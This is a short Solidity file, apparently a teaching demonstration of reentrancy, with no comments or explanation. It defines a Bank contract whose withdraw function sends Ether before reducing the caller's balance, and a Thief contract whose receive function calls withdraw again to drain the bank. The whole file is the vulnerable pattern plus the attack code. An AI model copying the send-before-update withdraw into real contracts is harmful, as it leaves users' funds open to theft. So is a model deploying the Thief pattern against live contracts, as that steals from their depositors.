

pragma solidity ^0.8.17;

 contract Bank {
   mapping(address => uint) public balances;

   function deposit() public payable{
     balances[msg.sender] += msg.value;
   }

   function withdraw(uint _amount) public {
    require(balances[msg.sender] >= _amount);
    (bool sent, ) = msg.sender.call{value: _amount}("");
    require(sent, "Failed to send Ether");

    balances[msg.sender] -= _amount;
   }

   function getBalance() public view returns (uint) {
    return address(this).balance;
   } 
}

contract Thief {
  Bank public bank;

  constructor(address _bankAddress) public {
    bank = Bank(_bankAddress);
  }

  receive() external payable{
    if(address(bank).balance >= 1 ether){
        bank.withdraw(1 ether);
    }

  }

  function attack() external payable {
    require(msg.value >= 1 ether);
    bank.deposit{value: 1 ether}();
    bank.withdraw(1 ether);
  }

  function getBalance() public view returns (uint) {
    return address(this).balance;
  }
}
